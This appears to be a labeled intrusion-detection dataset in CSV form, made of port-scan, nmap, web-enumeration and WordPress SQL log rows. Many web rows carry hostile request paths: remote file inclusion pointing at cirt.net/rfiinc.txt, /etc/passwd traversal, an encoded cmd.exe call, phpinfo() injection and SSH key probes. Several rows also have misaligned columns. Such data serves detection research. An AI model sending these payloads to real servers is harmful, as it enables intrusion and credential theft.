@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666700305, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666630736,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1664368890,192.168.91.128,46392,192.168.91.1,139,TCP,0,0,0,0,0,0,0,port_scan,2
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/bb_admin.php?includeFooter=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd,Mozilla/5.00,0,0,web_enumeration,1
1666704036, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692070,10.132.100.50,0,10.32.4.176,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666712722, 192.168.10.2,9200,58598,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/ax.cgi,0,0,0,web_enumeration,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666590890,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666541336,127.0.0.1,53182,127.0.0.1,1120,2022-10-24 00:08:27 ALLOW TCP 127.0.0.1 127.0.0.1 53182 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591490,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591900,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666591650,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666631046,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666541343,0,53322,35.82.5.217,443,0,0,0,0,0,0,0,0,port_scan,0
1666590710,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692056,10.32.4.176,39798,10.132.100.52,3914,TCP,0,0,0,0,0,0,0,port_scan,0
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/doc/SETNETLP_Guide-S,Mozilla/5.00,0,0,web_enumeration,1
1666542436,192.168.1.254,33947,239.255.255.250,1900,2022-10-24 00:26:42 DROP UDP 192.168.1.254 239.255.255.250 33947 1900 443 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666631222,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691996,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691932,100.64.19.103,52610,100.64.19.22,1154,TCP,0,0,0,0,0,0,0,port_scan,3
1666692138,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666700246, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692064,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,59306,10.132.100.53,306,TCP,0,0,0,0,0,0,0,port_scan,0
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/lib/authuser.php?root=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/creat_news_all.php?language=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666631284,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591387,10.0.0.20,33886,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT @@SESSION.sql_mode,sql_enumeration,0
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum/member.php?repertorylevel=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192.168.207.167.tar.bz2,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/idbc,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666541388,0,49595,151.106.248.1,8181,0,0,0,0,0,0,0,0,port_scan,3
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Welcome.do,Mozilla/5.00,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/survey.cgi,0,0,0,web_enumeration,2
1666582486,192.168.207.142,0,0,0,HTTPS,POST,0,404,/moadmin/moadmin.php,Mozilla/5.00,0,0,web_enumeration,1
1666591707,10.0.0.20,34154,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT FOUND_ROWS(),sql_enumeration,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/administr8/,Mozilla/5.00,0,0,web_enumeration,1
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666700490, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591847,10.0.0.20,34274,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_large_crop' LIMIT 1,sql_enumeration,0
1666691953,100.64.19.22,8443,100.64.19.103,43476,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,38422,10.132.100.53,726,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692055,10.132.100.52,22,10.32.4.176,37980,TCP,0,0,0,0,0,0,0,port_scan,0
1666692058,10.32.4.176,51558,10.132.100.52,10000,TCP,0,0,0,0,0,0,0,port_scan,0
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/public/,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541395,0,52588,127.0.0.1,49694,0,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wu-moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/bb0ack.sh,0,0,0,web_enumeration,2
1666591317,10.0.0.20,33828,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/.ssh/id_ecdsa,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/newtopic.php,0,0,0,web_enumeration,2
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,404,/level/99/exec//show,Mozilla/5.00,0,0,web_enumeration,1
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664373568,0,49876,0,5355,UDP,0,0,0,0,0,0,0,port_scan,0
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,404,/level/81/exec//show,Mozilla/5.00,0,0,web_enumeration,1
1666691982,10.32.4.176,43668,10.132.100.53,49175,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 10.0.0.3,4444,45530,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692057,10.32.4.176,36080,10.132.100.52,1087,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/incoming,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591310,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692056,10.32.4.176,38400,10.132.100.52,4279,TCP,0,0,0,0,0,0,0,port_scan,0
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/vgn/ac/edit,Mozilla/5.00,0,0,web_enumeration,1
1666590707,10.0.0.20,33304,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webadmin.php,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541321,192.168.1.225,50933,74.125.130.94,443,2022-10-24 00:08:11 ALLOW UDP 192.168.1.225 74.125.130.94 50933 443 0 - - - - - - - SEND 18232,UDP,0,0,0,0,0,0,port_scan,1
1666541395,192.168.1.225,5353,224.0.0.251,5353,2022-10-24 00:09:25 ALLOW UDP 192.168.1.225 224.0.0.251 5353 5353 0 - - - - - - - RECEIVE 17808,UDP,0,0,0,0,0,0,port_scan,2
1666541581,0,33947,239.255.255.250,1900,0,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/~user,gobuster/3.2.0-dev,0,0,web_enumeration,1
1664428800,192.168.91.128,52814,192.168.91.1,142,tcp,0,0,0,0,0,0,0,port_scan,2
1666591267,10.0.0.20,33778,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (1) ORDER BY meta_id ASC",sql_enumeration,0
1666591950,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/stats.html,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692065,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver,Mozilla/5.00,0,0,web_enumeration,1
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum/newthread.php,0,0,0,web_enumeration,2
1666692058,10.32.4.176,44600,10.132.100.52,24,TCP,0,0,0,0,0,0,0,port_scan,0
1666630365,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666591587,10.0.0.20,34054,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666591737,10.0.0.20,34182,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_entries' LIMIT 1,sql_enumeration,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542593,192.168.1.225,5353,224.0.0.251,5353,2022-10-24 00:29:14 ALLOW UDP 192.168.1.225 224.0.0.251 5353 5353 0 - - - - - - - RECEIVE 17808,UDP,0,0,0,0,0,0,port_scan,2
1666630607,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/BetaBlockModules//Module/Module.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666589121,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591927,10.0.0.20,34340,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (1) ORDER BY meta_id ASC",sql_enumeration,0
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/purchases/,Mozilla/5.00,0,0,web_enumeration,1
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1664368726,192.168.91.15,60707,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/groups,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666590990,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin_logon.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591327,10.0.0.20,33836,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT DISTINCT t.term_id, tr.object_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id
			WHERE tt.taxonomy IN ('category', 'post_tag', 'post_format') AND tr.object_id IN (1)
			ORDER BY t.name ASC",sql_enumeration,0
1666692056,10.32.4.176,57270,10.132.100.52,9485,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,33884,10.132.100.53,3784,TCP,0,0,0,0,0,0,0,port_scan,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168.cer,Mozilla/5.00,0,0,web_enumeration,1
1666590737,10.0.0.20,33328,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666591349,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum/member.php,0,0,0,web_enumeration,2
1666580400,192.168.207.142,0,0,0,HTTPS,GET,0,404,/PaTh/index.php?rootpath=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666541686,0,5353,224.0.0.251,5353,0,0,0,0,0,0,0,0,port_scan,3
1666692037,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ingress.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666630902,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666591277,10.0.0.20,33786,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1664428830,192.168.91.128,42528,192.168.91.1,171,tcp,0,0,0,0,0,0,0,port_scan,2
1666691973,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666631395,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666590987,10.0.0.20,33542,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webdav/index.html,Mozilla/5.00,0,0,web_enumeration,1
1666692058,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691948,100.64.19.103,37614,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692038,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691930,100.64.19.103,53276,100.64.19.22,1073,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,37608,10.132.100.53,1024,TCP,0,0,0,0,0,0,0,port_scan,0
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/logs/readme.txt,Mozilla/5.00,0,0,web_enumeration,1
1666705121, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691930,100.64.19.103,37532,100.64.19.22,1300,TCP,0,0,0,0,0,0,0,port_scan,3
1666590847,10.0.0.20,33422,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT DISTINCT t.term_id, tr.object_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id
			WHERE tt.taxonomy IN ('category', 'post_tag', 'post_format') AND tr.object_id IN (1)
			ORDER BY t.name ASC",sql_enumeration,0
1666696057, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541343,127.0.0.1,53298,127.0.0.1,1120,2022-10-24 00:08:44 ALLOW TCP 127.0.0.1 127.0.0.1 53298 1120 0 - 0 0 0 - - - RECEIVE 4432,TCP,0,0,0,0,0,0,port_scan,3
1666582474,192.168.207.142,0,0,0,HTTPS,GET,0,404,/iissamples/issamples/codebrws.asp,Mozilla/5.00,0,0,web_enumeration,1
1666541753,192.168.1.225,60930,54.201.232.75,443,TCP,0,0,0,0,0,0,0,port_scan,1
1666691932,100.64.19.103,37202,100.64.19.22,5633,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/list,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591860,0,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692043,10.132.100.53,445,10.32.4.176,41682,TCP,0,0,0,0,0,0,0,port_scan,0
1666631574,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666542071,192.168.106.1,51003,192.168.106.130,53,2022-10-24 00:20:37 ALLOW UDP 192.168.106.1 192.168.106.130 51003 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692065,10.32.4.176,46502,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666582467,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192_168_207_167.egg,Mozilla/5.00,0,0,web_enumeration,1
1666591540,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sips/sipssys/users/a/admin/user,Mozilla/5.00,0,0,web_enumeration,1
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00,Mozilla/5.00,0,0,web_enumeration,1
1666591177,10.0.0.20,33702,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'theme_switched' LIMIT 1,sql_enumeration,0
1664429630,192.168.91.128,34166,167.71.195.165,123,udp,0,0,0,0,0,0,0,port_scan,2
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/axis2/SOAPMonitor,Mozilla/5.00,0,0,web_enumeration,1
1666590717,10.0.0.20,33312,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_entries' LIMIT 1,sql_enumeration,0
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/uploader.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666697218, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666542124,192.168.106.1,57903,192.168.106.130,53,2022-10-24 00:21:31 ALLOW UDP 192.168.106.1 192.168.106.130 57903 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/dispatcher,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691985,10.32.4.176,37960,10.132.100.53,3690,TCP,0,0,0,0,0,0,0,port_scan,0
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/users/,0,0,0,web_enumeration,2
1666722170, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/Z.php ,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666691984,10.32.4.176,58128,10.132.100.53,1009,TCP,0,0,0,0,0,0,0,port_scan,0
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/hyperstat/stat_what.log,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/aliases.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666697475, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666700236, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/web/BetaBlockModules/UploadMediaModule/UploadMediaModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/moderator/login.html,Mozilla/5.00,0,0,web_enumeration,1
1666582467,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168207.alz,Mozilla/5.00,0,0,web_enumeration,1
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666631376,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692133,10.32.4.176,57784,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666694984, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/meta.pl,0,0,0,web_enumeration,2
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/accounting/,Mozilla/5.00,0,0,web_enumeration,1
1666692058,10.32.4.176,56536,10.132.100.52,6005,TCP,0,0,0,0,0,0,0,port_scan,0
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/WebShop/templates/cc.txt,0,0,0,web_enumeration,2
1666691982,10.32.4.176,47910,10.132.100.53,55056,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,42174,10.132.100.52,7911,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,47588,10.132.100.53,5815,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/proof,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582470,192.168.207.142,0,0,0,HTTPS,GET,0,404,/structure.sql,Mozilla/5.00,0,0,web_enumeration,1
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/CheckUpload.php?Language=http://cirt.net/rfiinc.txt?&cmd=ls,Mozilla/5.00,0,0,web_enumeration,1
1666692037,10.132.100.53,445,10.32.4.176,41544,TCP,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/zentrack/index.php,0,0,0,web_enumeration,2
1666630581,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd,Mozilla/5.00,0,0,web_enumeration,1
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691932,100.64.19.103,60006,100.64.19.22,90,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/news/include/customize.php?l=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666590717,10.0.0.20,33312,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/config.php?full_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
